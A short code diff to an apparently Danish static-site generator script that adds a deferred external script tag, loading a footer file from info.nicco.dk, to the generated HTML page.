@@ -108,6 +108,7 @@ a:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
 </header>
 ${dele.join('\n')}
 </main>
+<script src="https://info.nicco.dk/fod.js" defer></script>
 `;
 
 fs.writeFileSync(ud, html);
